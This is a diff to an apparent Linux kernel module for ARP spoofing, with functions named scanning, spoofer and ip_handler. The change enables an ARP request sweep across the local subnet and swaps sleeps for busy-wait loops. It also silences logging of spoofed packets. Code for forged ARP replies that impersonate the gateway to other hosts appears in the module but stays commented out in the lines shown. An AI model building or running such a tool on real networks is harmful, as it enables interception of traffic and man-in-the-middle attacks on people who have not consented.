@@ -18,8 +18,6 @@
 #include <linux/sched/signal.h> //send_sig()
 #include <linux/string.h>
 
-#include <net/ip_fib.h>
-
 //int sys_ip = inet_select_addr(dev, 0, RT_SCOPE_UNIVERSE);
 //inet_ioctl()
 //static struct inet_protosw inetsw_array[]
@@ -160,22 +158,23 @@ static void unreg_arp_hook(void)
 
 static void scanning(void)
 {
-	int base = 1;
+	int base = 1, t;
 	unsigned int target = 0; //network byte order
 
 	for (; base < max; base++)
 	{
 		target = (net_ip | (htonl(base)));
-		//arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
-			//0x12345678, netdev->broadcast, host.haddr, NULL);
-		msleep_interruptible(1);
+		arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
+			0x12345678, netdev->broadcast, host.haddr, NULL);
+		//msleep_interruptible(1);
+		for (t = 0; t < 2000000; t++); //busy wating
 	}	
 	printk("scanning: finished\n");	
 }
 
 static int spoofer(void * ptr)
 {
-	unsigned int who = 0;
+	unsigned int who = 0, t;
 
 	allow_signal(SIGUSR1); //allow interrupt
 	scanning();
@@ -199,7 +198,8 @@ static int spoofer(void * ptr)
 
 		//arp_send(ARPOP_REPLY, ETH_P_ARP, others[who]->paddr, netdev,
 			//gw.paddr, others[who]->haddr, host.haddr, others[who]->haddr);
-		msleep_interruptible(1);
+		//msleep_interruptible(1);
+		for (t = 0; t < 100000; t++);
 	}
 	
 	//restore routine
@@ -212,8 +212,8 @@ static int ip_handler(struct sk_buff * skb, struct net_device * dev1,
 	struct ethhdr * eth = eth_hdr(skb);
 	struct iphdr * ip = ip_hdr(skb);
 
-	if (!memcmp(eth->h_dest, host.haddr, 6))
-		printk("[%pI4, %pM]spoofed packet\n", &ip->saddr, eth->h_source);
+	/*if (!memcmp(eth->h_dest, host.haddr, 6))
+		printk("[%pI4, %pM]spoofed packet\n", &ip->saddr, eth->h_source);*/
 
 	if (ip->protocol == IPPROTO_UDP)
 	{
@@ -239,27 +239,8 @@ static void unreg_ip_handler(void)
 	dev_remove_pack(&pktype);
 }
 
-static void test(void)
-{
-	struct fib_result res;
-
-	fib_lookup(&init_net, NULL, &res, 0);
-
-	/*if (!ft)
-	{	
-		printk("ft is null\n");
-		return;
-	}
-
-	printk("id: %#x\n", ft->tb_id);
-	printk("tb_data: %lu\n",*ft->tb_data);*/
-}
-
 int spoof_init(void)
 {
-	//test();
-	//return -1;
-
 	if (init_device() < 0)
 		goto init_err;
 
